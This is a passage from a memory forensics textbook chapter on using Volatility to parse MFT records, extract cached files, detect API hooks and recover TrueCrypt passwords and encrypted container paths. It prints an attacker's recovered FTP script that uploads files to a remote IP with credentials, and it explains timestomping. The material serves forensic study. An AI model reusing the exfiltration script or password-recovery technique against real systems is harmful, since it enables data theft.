[MFT FILE_NAME] WINDOWS\system32\systems\1 (Offset: 0x1b2dd400)
[snip]
```

#### Surveying the Network

By sorting the `mftparser` output using the `mactime` utility, you can determine that the following Prefetch files were created after `SWING-MECHANICS.DOC[1].EXE-013CEA10.pf`. This evidence indicates that the attacker was performing reconnaissance of the network after gaining access to the system.

```
[MFT FILE_NAME] WINDOWS\Prefetch\IPCONFIG.EXE-2395F30B.pf (Offset: 0x10c05800)
[MFT FILE_NAME] WINDOWS\Prefetch\NET.EXE-01A53C2F.pf (Offset: 0x13e5d800)
[MFT FILE_NAME] WINDOWS\Prefetch\PING.EXE-31216D26.pf (Offset: 0x11b0f400)
```

#### WinRAR Archive Exfiltration

Also, if you look at the sorted output, you can see evidence that the attacker may have archived the PDFs into a RAR file. Specifically, a `WinRAR` folder was created in the user’s `Application Data` directory right after `r.exe` executed. It’s well documented that WinRAR creates this folder when it runs for the first time on a system. Shortly after these artifacts appear, the `ftp.exe` application is run:

```
 [MFT FILE_NAME] WINDOWS\system32\systems\1\confidential3.pdf (Offset: 0x6927500)
[MFT FILE_NAME] WINDOWS\system32\systems\1\confidential4.pdf (Offset: 0xd6948b0)
[MFT FILE_NAME] WINDOWS\system32\systems\1\confidential5.pdf 
    (Offset: 0x10a1cc88)
[MFT FILE_NAME] WINDOWS\system32\systems\r.exe (Offset: 0x18229400)
[MFT FILE_NAME] WINDOWS\Prefetch\R.EXE-19834F9B.pf (Offset: 0x1eb2a400)
[MFT FILE_NAME] Documents and Settings\binge\Application Data\WinRAR 
    (Offset: 0xd6b4000)
[MFT FILE_NAME] WINDOWS\Prefetch\FTP.EXE-0FFFB5A3.pf (Offset: 0x1bd10000)
```

To verify whether the `r.exe` program is WinRAR, you can use the `dumpfiles` plugin (discussed later in this chapter) to extract it and then analyze it with the `strings` utility. The following output shows how to accomplish this:

```
$ python vol.py –f grrcon.raw filescan | grep -i r.exe$
Volatility Foundation Volatility Framework 2.4
[snip] 
0x00000000021be7a0      1      0 R--r-d 
    \Device\HarddiskVolume1\WINDOWS\system32\systems\r.exe
[snip]

$ mkdir output
$ python vol.py –f grrcon.raw dumpfiles -Q 0x00000000021be7a0 –D output
Volatility Foundation Volatility Framework 2.4
ImageSectionObject 0x021be7a0   None   
    \Device\HarddiskVolume1\WINDOWS\system32\systems\r.exe
DataSectionObject 0x021be7a0   None   
    \Device\HarddiskVolume1\WINDOWS\system32\systems\r.exe
```

The `dumpfiles` plugin extracts one file:

```
$ ls output/
file.None.0x82137f10.img
```

If you are using the `strings` utility on Linux, you need to make two passes, one for ASCII and one for Unicode:

```
$ strings –a file.None.0x82137f10.img > r.exe_strings
$ strings –a –el file.None.0x82137f10.img >> r.exe_strings
```

After that, you can examine the strings output. If you scroll down you’ll find a help message. This message belongs to WinRAR (see [https://discussions.apple.com/thread/4114488?tstart=0](https://discussions.apple.com/thread/4114488?tstart=0)) and it helps prove that the attackers used WinRAR to create an archive of files:

```
$ less r.exe_strings
[snip]
  o[+|-]        Set the overwrite mode
  oc            Set NTFS Compressed attribute
  ol            Save symbolic links as the link instead of the file
  or            Rename files automatically
  os            Save NTFS streams
  ow            Save or restore file owner and group
  p[password]   Set password
[snip]
  s-            Disable solid archiving
  sc<chr>[obj]  Specify the character set
  sfx[name]     Create SFX archive
  si[name]      Read data from standard input (stdin)

[snip]

ERROR: Bad archive %s
#Enter password (will not be echoed)
Enter password
Reenter password: 
[snip]
```

#### MFT-Resident Data

Because attacker scripts are often small enough to be MFT-resident, it is worthwhile to run the `mftparser` plugin in verbose mode to extract any scripts that may exist. In this case, the verbose output of the `mftparser` plugin extracts one of the attacker’s scripts (`f.txt`). This script opens a connection to `66.32.119.38` using a username of `jack` and a password of `2awes0me`, switches to the `systems` directory where all the dropped files are, and uploads any text files in that directory to the `/home/jack` directory of the remote system:

```
 [snip]
Full Path: WINDOWS\system32\systems\f.txt

$DATA
0x00000000: 6f 70 65 6e 20 36 36 2e 33 32 2e 31 31 39 2e 33   open.66.32.119.3
0x00000010: 38 0d 0a 6a 61 63 6b 0d 0a 32 61 77 65 73 30 6d   8..jack..2awes0m
0x00000020: 65 0d 0a 6c 63 64 20 63 3a 5c 57 49 4e 44 4f 57   e..lcd.c:\WINDOW
0x00000030: 53 5c 53 79 73 74 65 6d 33 32 5c 73 79 73 74 65   S\System32\syste
0x00000040: 6d 73 0d 0a 63 64 20 20 2f 68 6f 6d 65 2f 6a 61   ms..cd../home/ja
0x00000050: 63 6b 0d 0a 62 69 6e 61 72 79 0d 0a 6d 70 75 74   ck..binary..mput
0x00000060: 20 22 2a 2e 74 78 74 22 0d 0a 64 69 73 63 6f 6e   ."*.txt"..discon
0x00000070: 6e 65 63 74 0d 0a 62 79 65 0d 0a                  nect..bye..
```

In this example, you can see how much of the attackers’ actions are recoverable from examining the MFT entries alone. In Chapter 18, which covers more timeline methods in depth, you will see how combining artifacts from other sources with the MFT helps paint an even clearer picture of the attackers’ actions.

### Timestomping the MFT

Attackers can manipulate timestamps of MFT entries to cover their tracks, a technique commonly referred to as timestomping. To see what, if any, effect timestomping would have on MFT entries in memory, we performed some experiments using SetMACE (see [http://code.google.com/p/mft2csv/downloads/detail?name=SetMACE_v1006.zip&can=2&q](http://code.google.com/p/mft2csv/downloads/detail?name=SetMACE_v1006.zip&can=2&q)). SetMACE enables you to set the timestamps for the `$SI` and `$FN` attributes for any file on the system, which can impede investigators relying on timelines.

In the first experiment, the `$FN` timestamps were changed, the system ran for 5 minutes, and then we re-accessed the file. There were no changes in the MFT entry in memory when running the `mftparser` plugin. In the second experiment, we changed the `$SI` timestamps instead. The timestamps in memory changed for this MFT entry immediately. Therefore, it appears as though the `$SI` timestamps are more volatile than the `$FN` timestamps in memory. Furthermore, these experiments prove that you cannot rely on comparing timestamps from MFT entries in memory to those on disk in an effort to detect timestomping. You can still detect timestomping in several ways, however. The following list identifies a few examples:

- The timestomping program has its own MFT entry, which you can find in memory.
- The timestomping program creates a Prefetch file after it executes, which you can use to show that it ran.
- A Shimcache entry (described in Chapter 10) is created when the timestomping program runs.
- Depending on the file whose timestamps were manipulated, you could also use timestamps from event logs, Shimcache, or recent document registry keys to determine if timestomping is involved. For example, a program having a Shimcache record with a timestamp, but manipulated file system timestamps, would be evidence of tampering.

### Disadvantages of MFT Scanning

On a system with multiple NTFS volumes, scanning memory for individual MFT records may cause conflicts. For example, MFT entries do not contain a member that maps back to the source drive because the actual drive is irrelevant to the file system. This can potentially result in corrupt file paths in the output of the `mftparser` plugin—for example, `NEWTEX~1.TXT\kdcom.dll`. You can tell that this path is corrupt because you see a text file as part of the path for a DLL. You should see something like `WINDOWS\system32\kdcom.dll` instead. This is because record numbers are sequential, and each volume has files with the same record numbers. Because the record number is used to distinguish the parent directory of a file, it is impossible to know for sure which record number is accurate.

One way you could avoid this issue is to extract each `$Mft` file using the `dumpfiles` plugin, discussed later in this chapter, and then process it offline. When you extract each `$Mft`, the `dumpfiles` plugin includes the original file path with `Device\HarddiskVolume#`, where the `#` is the number of the volume. You can use this to figure out which volume’s `$Mft` file you are processing. You can then use your tool of choice, or even Volatility with the `mftparser` plugin, to process the extracted `$Mft` files. A downside to this methodology is that you can possibly miss MFT entries no longer referenced in the `$Mft` file, but still lingering in memory.

## Extracting Files

The previous sections of this chapter demonstrated how the memory-resident file system artifacts from a Windows system can provide valuable information during an investigation. Although the file system metadata provides context about *where* the data is stored, *when* it was accessed, and occasionally the file’s content (MFT-resident data), you often need to examine the actual content of larger files. The content helps provide indications of malicious system modifications (such as API hooks), access to malware configuration information, or even plaintext views of files encrypted on disk.

Additionally, whereas Chapter 8 described how to extract binaries that were mapped into memory as executable file streams, this section extends that to include data files and executables mapped as data file streams. In particular, you will use Volatility to analyze the file mapping structures associated with both the Windows cache manager and memory manager to extract and reconstruct memory-resident file content. As an added advantage, the data extracted can also provide you with triage hints as to which components of the files are temporally or spatially relevant at the time of memory acquisition.

---

**NOTE**

Occasionally, people still attempt to reconstruct a file from a memory sample using traditional file carving tools, such as Scalpel (`https://github.com/sleuthkit/scalpel`). In most instances, they attempt to run a carving tool directly against a memory sample. These tools linearly scan the data, looking for specific signatures associated with well-known file formats. Unfortunately, most of these tools assume the file data is contiguous and that the media being analyzed contains a whole copy of the file. This is a problem when dealing with RAM because the data stored in physical memory is inherently fragmented, and only parts of a file may actually be loaded into memory. As a result, except for files smaller than a page of memory, you are probably not going to extract the data you expect.

Alternatively, it is possible to use a plugin like `memdump` to extract the virtual address space of a particular process, and scan it using a linear file-carving tool. Although this can help address the issues with noncontiguous data, you still may lose important context associated with nonresident memory pages.

---

---

## **Analysis Objectives**

Your objectives are these:

- **Extract cached files:** You will learn how different types of files are loaded into memory, why Windows may maintain multiple views of those files, and the techniques for extracting those views. This can help you recover executable files, raw registry hives, event logs, documents (PDF, DOC, XLS), images, and more.
- **Leverage cached file data to augment investigations:** You will gain insight into how cached file data can be used to detect malicious modifications made to memory-resident file data. For example, you can compare a DLL’s executable code in memory with the cached copy from disk to detect malicious patches and hooks.
- **Access unencrypted files:** The operating system caches files that reside on encrypted media in the same manner as all other files. Thus, you can extract all or part of unencrypted file contents from memory and reveal suspects’ protected documents.

---

### Windows Cache Manager

Within the Windows operating system, the cache manager is the subsystem that provides data caching support for file system drivers. The cache manager is responsible for making sure the frequently accessed data is found in physical memory to improve I/O performance. The cache manager accomplishes this with the help of the memory manager. The cache manager accesses data by mapping views of files (within the virtual address space) using the memory manager’s support for memory-mapped files, also known as section objects. Thus, the memory manager controls which parts of the file data are actually memory-resident. On the other hand, the cache manager caches data within virtual address control blocks (VACBs). Each VACB corresponds to a 256KB view of data mapped in the system cache address space.

The remainder of the section describes how you can use the internal data structures associated with the memory manager and cache manager to reconstruct file artifacts.

---

**NOTE**

To see complete versions of the data structures mentioned in this section, use the `dt` command within `volshell`.

Additionally, you can find more information about the cache manager here:

- *Windows Internals* (6th Edition, Part 2) by Mark Russinovich and David A. Solomon
- *MoVP 4.4 Cache Rules Everything Around Me(mory)* by Aaron Walters: [http://volatility-labs.blogspot.com/2012/10/movp-44-cache-rules-everything-around.html](http://volatility-labs.blogspot.com/2012/10/movp-44-cache-rules-everything-around.html)

---

#### Executable (Image) and Data Files

To extract memory-resident files, you need to find the data and understand how it is being stored. Because the focus is files, it’s logical to start with the `_FILE_OBJECT`—a Windows kernel object used to track each instance of an open file. You can find these objects with a number of techniques, including pool scanning (Chapter 5), walking process-handle tables (Chapter 6), and accessing the file pointer embedded in process VAD nodes (Chapter 7).

After you find an instance of a `_FILE_OBJECT`, you can use its `SectionObjectPointer` member to find the associated `_SECTION_OBJECT_POINTERS`. The memory manager and the cache manager use this structure to store file mapping and cache information for a particular file stream. Based on the members of the `_SECTION_OBJECT_POINTERS`, you can determine if the file was mapped as data (`DataSectionObject`) and/or as an executable image object (`ImageSectionObject`), and if caching is being provided for this file.

[Figure 16-2](#figure16-2) shows a graphical representation of the objects rooted at the `ImageSectionObject` and `DataSectionObject`pointers. Both of these members are opaque pointers to control areas (`_CONTROL_AREA`). After you have found the offset of the associated control area, you can find the subsection structures (`_SUBSECTION`) used by the memory manager to track regions of memory-mapped file streams. The initial subsection structure is stored immediately after the `_CONTROL_AREA` in memory, and you find subsequent subsections by traversing a singly linked list that the `NextSubsection` member points to. If the file was mapped as data, there will most likely be only one subsection. On the other hand, if the file was mapped as an executable image, there will be one subsection for each section of the portable executable (PE).

![c16f002.eps](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c16/c16f002.png)

*[**Figure 16-2:**](#figureanchor16-2) The relationships among the data structures used to find and extract executable (ImageSectionObject) and data files (DataSectionObject)*

As shown in the figure, by leveraging the `SubsectionBase` member of `_SUBSECTION`, you can find a pointer to an array of page table entry (`_MMPTE`) structures. By traversing the array of page table entries, you can determine what pages are memory-resident and where they are stored in RAM. It is important to note that the size of `_MMPTE` changes not only between hardware architectures but also when a PAE-enabled kernel is being used. With this information, you can reconstruct those files that may be memory mapped as either data or image section objects.

#### Shared Cached Files

In the instances where caching is being provided, the `SharedCacheMap` member of the `_SECTION_OBJECT_POINTERS` structure is an opaque pointer to the `_SHARED_CACHE_MAP` structure, as seen in [Figure 16-3](#figure16-3). The cache manager uses the shared cache map to track the state of cached regions, including the previously described 256KB VACBs.

![c16f003.eps](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c16/c16f003.png)

*[**Figure 16-3:**](#figureanchor16-3) Relationships among the data structures used to extract a file from the SharedCacheMap*

As shown in the diagram, the cache manager uses VACB index arrays to store pointers to the VACBs. As a performance optimization, the `_SHARED_CACHE_MAP` contains a VACB index array named `InitialVacbs` that consists of four pointers—it is used for files 1MB or less in size. If the file is larger than 1MB, the `Vacbs` member of `_SHARED_CACHE_MAP` is used to store a pointer to a dynamically allocated VACB index array. If the file is larger than 32MB, a sparse multilevel index array is created where each index array can hold up to 128 entries. Because we are trying to find all the cached regions that may be memory-resident, we recursively walk the sparse multilevel array looking for file data. The `_VACB` contains the virtual address of where the data is stored in system cache (the `BaseAddress` member) and the offset where the data is found within the file (`FileOffset`). Using this information, you can reconstruct the file based on the cached regions found in memory.

### Volatility’s Dumpfiles Plugin

The `dumpfiles` plugin was developed to automate the aforementioned steps for finding and reconstructing memory-resident files. It was based on an earlier plugin called `exportfile`, which was originally developed by Carl Pulley to help solve Challenge 3 of the Honeynet Forensic Challenge 2010 (see `https://github.com/carlpulley/volatility`). In its default invocation, the `dumpfiles` plugin collects `_FILE_OBJECTS` from process handle tables and VAD trees. Using the `–p` option, it is possible to filter the results to include only the _`FILE_OBJECTS` associated with a particular PID. The `–Q` option allows an investigator to specify the physical address of a _`FILE_OBJECT`. After the specified file objects have been collected, it proceeds to extract all memory-mapped and cached regions to the designated output directory.

The following example shows the typical command line usage for `dumpfiles`. The `–S` option allows you to save a summary file that contains metadata such as the mapping of the original filename and its path when extracted to disk. The summary file also shows what regions of the file were paged out. In these cases, the plugin zero-pads those regions to maintain spatial alignment in the output file. The summary is formatted as JSON to facilitate further post-processing analysis. The `–D` option specifies where to store the extracted files.

```
$ python vol.py -f Win7SP1x64.mem --profile=Win7SP1x64 dumpfiles 
          -S summary.json -D output/
Volatility Foundation Volatility Framework 2.4
DataSectionObject 0xfffffa800d35c9e0   4      \Device\clfsKtmLog
SharedCacheMap    0xfffffa800d35c9e0   4      \Device\clfsKtmLog
DataSectionObject 0xfffffa800d40b7c0   4      \Device\HarddiskVolume1\Windows
  \System32\LogFiles\WMI\RtBackup\EtwRTDiagLog.etl
SharedCacheMap    0xfffffa800d40b7c0   4      \Device\HarddiskVolume1\Windows
  \System32\LogFiles\WMI\RtBackup\EtwRTDiagLog.etl
DataSectionObject 0xfffffa800d423320   4      \Device\HarddiskVolume1\Windows
  \System32\LogFiles\WMI\RtBackup\EtwRTEventLog-Application.etl
[snip]
```

---

**NOTE**

After the cached files are extracted, you can process them with file analysis tools. It is important to re-emphasize that parts of the extracted files may be zero-padded if the regions were not memory-resident. Most file analysis tools are not designed to robustly handle missing regions and, as a result, may report an error or produce only partial results.

---

The previous output presents information about the extracted files, such as the provenance from where the data was found (`DataSectionObject`, `ImageSectionObject`, or `SharedCacheMap`), the virtual address for the `_FILE_OBJECT`, the PID of the process that was accessing the file stream, and the path to where the data was stored on the file system. You can find the extracted files in the output directory. The following output shows a partial listing of the files in an output directory.

```
$ ls output/
file.392.0xfffffa800e1efc20.img
file.4.0xfffffa800d1fd210.dat
file.4.0xfffffa800d1fe6e0.vacb
[snip]
```

As you can see, the files are named according to a specific schema. The goals for the naming schema were to provide provenance for the data, to reduce the number of duplicated files, and to remove the ability for an attacker to control the filename. The files are named according to the following convention:

```
file.PID.[SCMOffset|CAOffset].[img|dat|vacb]
```

- **PID:** The process ID of the process where the _`FILE_OBJECT` was found.
- **SCMOffset:** The virtual address of the `SharedCacheMap` object from which the file was extracted (if applicable).
- **CAOffset:** The virtual address of the `_CONTROL_AREA` object from which the file was extracted (if applicable).
- **img:** The file extension used to indicate that this data was extracted from an `ImageSectionObject` object.
- **dat:** The file extension used to indicate that the data was extracted from a `DataSectionObject` object.
- **vacb:** The file extension used to indicate that the data was extracted from a `SharedCacheMap` object.

Using information from the summary file, you can map the extracted files to their original paths. The following code snippet demonstrates how you can accomplish this:

```
$ python 
>>> import json as json
>>> file = open("summary.json", "r")
>>> for item in file.readlines():
...     info = json.loads(item.strip())
...     print "{0} -> {1}".format(info["ofpath"], info["name"])
... 
output/file.4.0xfffffa800d3566e0.vacb -> \Device\clfsKtmLog
output/file.4.0xfffffa800d479280.dat -> \Device\HarddiskVolume1\Windows
  \System32\LogFiles\WMI\RtBackup\EtwRTDiagLog.etl
output/file.4.0xfffffa800d46fa10.vacb -> \Device\HarddiskVolume1\Windows
  \System32\LogFiles\WMI\RtBackup\EtwRTDiagLog.etl
```

---

**NOTE**

If you supply the `–n/--name` option to `dumpfiles`, it includes the original filename in the output file-naming schema. Keep in mind that the filename should not be considered trusted, and an attacker can manipulate it.

---

#### Targeted File Extraction

Depending on your analysis goals, you may want to extract only a subset of the files found in memory. For example, your investigation may focus on artifacts found in Windows event logs. To support these types of targeted extractions, the `dumpfiles` plugin provides the option to filter the results based on regular expressions. The following example demonstrates how to extract event logs from a Windows 7 64-bit memory dump using the `–r/--regex` option:

```
$ python vol.py -f Win7SP1x64.raw --profile=Win7SP1x64 dumpfiles 
       -D output/ -i -r .evtx$
Volatility Foundation Volatility Framework 2.4
DataSectionObject 0xfffffa800e598e20   756    \Device\HarddiskVolume1\Windows
  \System32\winevt\Logs\System.evtx
SharedCacheMap    0xfffffa800e598e20   756    \Device\HarddiskVolume1\Windows
  \System32\winevt\Logs\System.evtx
DataSectionObject 0xfffffa800c59e071f0   756    \Device\HarddiskVolume1\Windows
  \System32\winevt\Logs\Application.evtx
SharedCacheMap    0xfffffa800c59e071f0   756    \Device\HarddiskVolume1\Windows
  \System32\winevt\Logs\Application.evtx
DataSectionObject 0xfffffa800e596070   756    \Device\HarddiskVolume1\Windows
  \System32\winevt\Logs\Security.evtx
SharedCacheMap    0xfffffa800e596070   756    \Device\HarddiskVolume1\Windows
  \System32\winevt\Logs\Security.evtx
[snip]
```

As you can see, the plugin was able to extract the System, Application, and Security event logs, among others. During investigations, you may also want to extract files *not* found in the handle table or the VAD tree. For example, this can help if you wanted to extract the `$Mft` file (a NTFS special file) that you saw in the output of the `filescan` plugin. The `–Q`/`--physoffset` option for the `dumpfiles` plugin enables you to specify the physical memory address associated with a `_FILE_OBJECT`. The following example shows how to extract an `$Mft` file using this method:

```
$ python vol.py -f Win7SP1x64.raw --profile=Win7SP1x64 filescan | grep -i mft
Volatility Foundation Volatility Framework 2.4
0x000000003f915380      3      0 RW-rwd \Device\HarddiskVolume1\$MftMirr
0x000000003f922300     33      0 RW-rwd \Device\HarddiskVolume1\$Mft
0x000000003f926c80     33      0 RW-rwd \Device\HarddiskVolume1\$Mft

$ python vol.py -f Win7SP1x64.raw --profile=Win7SP1x64 dumpfiles 
      -D output/ -Q 0x000000003f922300
Volatility Foundation Volatility Framework 2.4
DataSectionObject 0x3f922300   None   \Device\HarddiskVolume1\$Mft
SharedCacheMap    0x3f922300   None   \Device\HarddiskVolume1\$Mft
```

---

**NOTE**

In our experience, the output of the `filescan` plugin often contains more than one `$Mft` reference, even on systems with only one volume. You may have to extract both `$Mft` files and examine them with a hex editor, because typically only one of the versions is valid.

---

#### Detecting Modified Code

An example of an interesting use case for the `dumpfiles` plugin involves comparing the memory-mapped and cached versions of files to look for malicious modifications. For example, if malware attempts to make an inline control flow change to the text section of a memory-resident PE, they will often get a private version of the page mapped into their address space (this is known as copy-on-write). By comparing different views of the data, you can easily identify anomalies. For example, suppose that you run the `apihooks` plugin and find the following hook in the `WININET.dll` library for `IEXPLORE.EXE`:

```
$ python vol.py -f silentbanker.vmem apihooks
      --profile=WinXPSP3x86

[snip]

 Hook mode: Usermode
 Hook type: Inline/Trampoline
 Process: 1884 (IEXPLORE.EXE)
 Victim module: WININET.dll (0x771b0000 - 0x77256000)
 Function: WININET.dll!CommitUrlCacheEntryA at 0x771b5319
 Hook address: 0x1080000
 Hooking module: <unknown>
 
 Disassembly(0):
 0x771b5319 e9e2acec89        JMP 0x1080000
 0x771b531e 83ec48            SUB ESP, 0x48
 0x771b5321 53                PUSH EBX
 0x771b5322 56                PUSH ESI
 0x771b5323 8b3548131b77      MOV ESI, [0x771b1348]
 0x771b5329 57                PUSH EDI
 0x771b532a 6aff              PUSH -0x1
 0x771b532c fc75f008            PUSH DWORD [EBP+0x8]
 0x771b532f ffd6              CALL ESI
[snip]
```

The output tells you that the first few instructions of the `CommitUrlCacheEntryA` function at address `0x771b5319` were overwritten with a `JMP` instruction that leads outside of `WININET.dll`. The new values, shown in bold, are `E9 E2 AC EC 89`. If you extract the modified DLL using the `dlldump` plugin, as discussed in Chapter 8, the extracted file will contain the previously identified code modifications. Here’s an example:

```
$ python vol.py dlldump -f silentbanker.vmem --profile=WinXPSP3x86
           -p 1884 -i -r wininet.dll -D extracted
Volatility Foundation Volatility Framework 2.4
Process(V) Name                 Module Base Module Name          Result
---------- -------------------- ----------- -------------------- ------
0x80f1b020 IEXPLORE.EXE         0x0771b0000 WININET.dll          OK: 
  module.1884.107e020.771b0000.dll

$ xxd module.1884.107e020.771b0000.dll | less
[snip]
00004710 3BF6 FFFF 9090 9090 90E9 E2AC EC89 83EC   ;...............
00004720 4853 568B 3548 131B 7757 6AFF FF75 08FF   HSV.5H..wWj..u..
```

As you can see, at offset `0x4719` of the file, the five modified bytes appear. Alternatively, if you extract the same DLL using `dumpfiles`, you will find an unmodified version of the code within the extracted DLL.

```
$ python vol.py dumpfiles -f silentbanker.vmem --profile=WinXPSP3x86
       -p 1884 -r wininet.dll -D extracted
Volatility Foundation Volatility Framework 2.4
ImageSectionObject 0xff3b9130   1884 
  \Device\HarddiskVolume1\WINDOWS\system32\wininet.dll

$ xxd file.1884.0x80f04f30.img | less
[snip]
00004710 3BF6 FFFF 9090 9090 908B FF55 8BEC 83EC  ;..........U....
00004720 4853 568B 3548 131B 7757 6AFF FF75 08FF  HSV.5H..wWj..u..
```

In this version of the DLL, offset `0x4719` contains the original bytes `8B FF 55 8B EC`. Using the `dumpfiles` plugin, the code extracted matches the version from disk, whereas the version found using the `dlldump` plugin was modified with an inline control flow change. This is the effect that in-memory API hooks have.

This use case was intended to provide an example of the type of analysis possible by analyzing the memory-resident file data. In this example, you were able to identify control flow changes made to the system using the memory-mapped data. The analysis could be extended to analyze each process’ view of the file or to use those views to potentially fill in nonresident pages in a particular address space.

---

**NOTE**

The comparison just discussed would not be as obvious if malware patched the file on disk instead of only the memory-mapped version, because then all data sources would match. However, technologies such as Windows File Protection (WFP) serve to prevent on-disk patching of critical system files. Additionally, by patching on disk, the malware’s code is written to more permanent storage, something that is often undesirable from a stealth perspective.

---

## Defeating TrueCrypt Disk Encryption

A common use for memory forensics, especially among practitioners in law enforcement, is to defeat disk encryption. Suspects often protect their data with full disk encryption (FDE) software such as TrueCrypt, Microsoft BitLocker, Symantec Drive Encryption (PGP Desktop), or Apple FileVault. While a system is powered off, the whole disk, individual partition(s), or “virtual” file-based containers are encrypted. This protection results in serious challenges for investigators, even if they gain access to the media (laptop, thumb drive, and so on). However, if a system is running and the media is connected and mounted (that is, unlocked), the user’s applications can freely and transparently access the data on the drive, which is decrypted on the fly as it is accessed. As a result, RAM may contain cached volume passwords, master encryption keys, and/or portions of unencrypted files.

In this section, we present a novel approach to find and extract TrueCrypt master encryption keys from memory dumps. We also cover how to extract cached passwords and identify encrypted volumes. It’s important to note that, although we focus on TrueCrypt, the various other products are susceptible to the same type(s) of data collection. Furthermore, we aren’t exploiting security vulnerabilities in the encryption software. After all, the products encrypt disks (or files on a disk), not RAM.

If you’re not familiar with attacks against disk encryption, see the following resources before reading the rest of this section:

- *RAM is Key: Extracting Disk Encryption Keys From Volatile Memory* by Brian Kaplan and Matthew Geiger: [http://cryptome.org/0003/RAMisKey.pdf](http://cryptome.org/0003/RAMisKey.pdf).
- *Lest We Remember: Cold Boot Attacks on Encryption Keys* by students at Princeton University: [https://citp.princeton.edu/research/memory](https://citp.princeton.edu/research/memory).
- *The Persistence of Memory: Forensic Identification and Extraction of Cryptographic Keys* by Carsten Maartmann-Moe: [http://www.dfrws.org/2009/proceedings/p132-moe.pdf](http://www.dfrws.org/2009/proceedings/p132-moe.pdf).

---

**NOTE**

Because we don’t mention it elsewhere, it *is* possible to encrypt RAM. For example TRESOR ([https://www.usenix.org/legacy/events/sec11/tech/full_papers/Muller.pdf](https://www.usenix.org/legacy/events/sec11/tech/full_papers/Muller.pdf)) is a Linux kernel patch that runs encryption securely outside of RAM. The master keys are stored on the CPU instead of in main memory. Likewise, PrivateCore ([http://www.privatecore.com](http://www.privatecore.com)) is a commercially available product that fully encrypts memory on x86 systems. In short, it uses a KVM hypervisor that runs from an Intel CPU’s L3 cache and acts as an encryption gateway for data in main memory.

---

### Password Caching

TrueCrypt supports caching passwords and key files in memory. Although this feature is disabled by default, many users enable it for convenience. This unprotected data in memory is the “low-hanging fruit” so to speak. If exposed in a memory capture, investigators can use the credentials to fully reveal data on the encrypted media. As shown in [Figure 16-4](#figure16-4), when you initially mount a volume (or container), you can choose to “save” the password.

![c16f004.eps](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c16/c16f004.png)

*[**Figure 16-4:**](#figureanchor16-4) TrueCrypt supports caching passwords and key files in memory.*

The TrueCrypt driver in kernel mode (`truecrypt.sys`) manages the caching functionality. Specifically, when passwords are cached, the driver uses a structure defined in the `Common/Password.h` header file to store the passwords:

```
// Minimum possible password length
#define MIN_PASSWORD                   1
// Maximum possible password length
#define MAX_PASSWORD                  64
typedef struct
{
       // Modifying this structure can 
       // introduce incompatibility with previous versions
       unsigned __int32 Length;
       unsigned char Text[MAX_PASSWORD + 1];
       char Pad[3]; // keep 64-bit alignment
} Password;
```

The minimum and maximum password lengths are 1 and 64, respectively. The value of the password is stored in the `Text` member, which follows a `Length` field that specifies the number of characters in the password. To maintain 64-bit alignment, there are 3 bytes of padding (all 0) at the end. When you run the `truecryptpassphrase` plugin against a memory dump, it scans for instances of the password structure. Here’s an example:

```
$ python vol.py -f Win8SP0x86-Pro.mem 
      --profile=Win8SP0x86 truecryptpassphrase

Volatility Foundation Volatility Framework 2.4
Found at 0x9cd8f064 length 31: duplicative30205_nitrobacterium
```

Armed with the password, investigators can fully decrypt the protected media offline (that is, in a manner independent of the suspect’s system). Although this data recovery technique requires users to explicitly enable password caching, the encrypted volume does *not* need to be mounted at the time of memory acquisition. TrueCrypt allows users to clear the password cache on demand, which should remove the sensitive data from RAM.

### Encrypted Volume Identification

Another challenge that investigators face is identifying the encrypted volume. If you don’t know what hard drive, partition, or “virtual” file serves as the encrypted container, having the password is only as useful as finding the key to a house but having no idea where the house is. To address this problem, we created the `truecryptsummary` plugin. Here’s an example of the output:

```
$ python vol.py -f Win8SP0x86-Pro.mem --profile=Win8SP0x86 truecryptsummary
Volatility Foundation Volatility Framework 2.4

Registry Version  TrueCrypt Version 7.1a
Process           TrueCrypt.exe at 0x85d79880 pid 3796
Kernel Module     truecrypt.sys at 0x9cd5b000 - 0x9cd92000
Symbolic Link     Volume{ad5c0504-eb77-11e2-af9f-8c2daa411e3c} -> 
\Device\TrueCryptVolumeJ mounted 2013-10-10 22:51:29 UTC+0000
File Object       \Device\TrueCryptVolumeJ\ at 0x6c1a038
File Object       \Device\TrueCryptVolumeJ\Chats\GOOGLE\Query\
modernimpact88@gmail.com.xml at 0x25e8e7e8
File Object       \Device\TrueCryptVolumeJ\Pictures\haile.jpg at 0x3d9d0810
File Object       \Device\TrueCryptVolumeJ\Pictures\nishikori.jpg at 0x3e44cc38
File Object       \Device\TrueCryptVolumeJ\$RECYCLE.BIN\
desktop.ini at 0x3e45f790
File Object       \Device\TrueCryptVolumeJ\ at 0x3f14b8d0
File Object       \Device\TrueCryptVolumeJ\Chats\GOOGLE\Query\
modernimpact88@gmail.com.log at 0x3c33f032f0
Driver            \Driver\truecrypt at 0x18c57ea0 range 0x9cd5b000 - 0x9cd91b80
Device            TrueCryptVolumeJ at 0x86bb1728 type FILE_DEVICE_DISK
Container         Path: \??\C:\Users\Mike\Documents\lease.pdf
Device            TrueCrypt at 0x85db6918 type FILE_DEVICE_UNKNOWN
```

Note the following points:

- By querying the cached registry hives in memory, the plugin tells you the TrueCrypt version (7.1a) installed on the target system.
- Based on the symbolic link objects, the volume was mounted on the `J:` drive letter at 2013-10-10 22:51:29.
- Various pictures and Gmail chat logs exist on the TrueCrypt volume.

Finally, the plugin tells you the full path to the encrypted file container: `C:\Users\Mike\Documents\lease.pdf`. If you have a forensic disk image, now you can extract the `lease.pdf` file and unlock it with the previously recovered password. Without the information provided by the `truecryptsummary` plugin, you would need an alternate method to identify the encrypted container. For example, you could calculate entropy or analyze file metadata (see the TCHunt tool’s FAQ here: [http://16s.us/software/TCHunt/tchunt_faq.txt](http://16s.us/software/TCHunt/tchunt_faq.txt)).

### The Cache Manager and NTFS Metadata

In the previous example, you saw a “virtual” file-based container formatted with the FAT32 file system. The next case displays results from the `truecryptsummary` plugin when analyzing an entire partition (USB thumb drive) formatted with NTFS. In the following output, you can see the TrueCrypt volume mounted on the suspect system on 2013-10-11, and the container is `\Device\Harddisk1\Partition1`.

```
$ python vol.py -f WIN-QBTA4959AO9.raw --profile=Win2012SP0x64 truecryptsummary
Volatility Foundation Volatility Framework 2.4

Process           TrueCrypt.exe at 0xfffffa801af43980 pid 2096
Kernel Module     truecrypt.sys at 0xfffff88009200000 - 0xfffff88009241000
Symbolic Link     Volume{52b24c47-eb79-11e2-93eb-000c29e29398} -> 
